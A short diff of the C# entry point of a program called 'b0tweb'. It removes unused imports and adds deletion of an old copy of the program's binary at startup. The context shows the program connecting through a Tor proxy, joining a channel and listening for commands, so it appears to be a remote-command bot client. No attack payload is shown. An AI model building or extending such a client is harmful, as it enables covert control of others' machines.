@@ -1,7 +1,4 @@
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using System.Threading;
 using b0tweb.MessageHandlers;
 
@@ -20,6 +17,9 @@ namespace b0tweb
         /// <param name="args">The command line arguments.</param>
         public static void Main(string[] args)
         {
+            // Check if the old version is still stored.
+            FileHelper.DeleteFile(FileHelper.GetBinaryOldPath());
+
             Console.WriteLine("Welcome to the b0tweb");
 
             TorProxy proxy = new TorProxy();
@@ -37,6 +37,7 @@ namespace b0tweb
             controller.AddMessageHandler(new CommandMessageHandler());
 
             controller.Join(Program.Channel);
+
             controller.Listen();
 
             proxy.Disconnect();
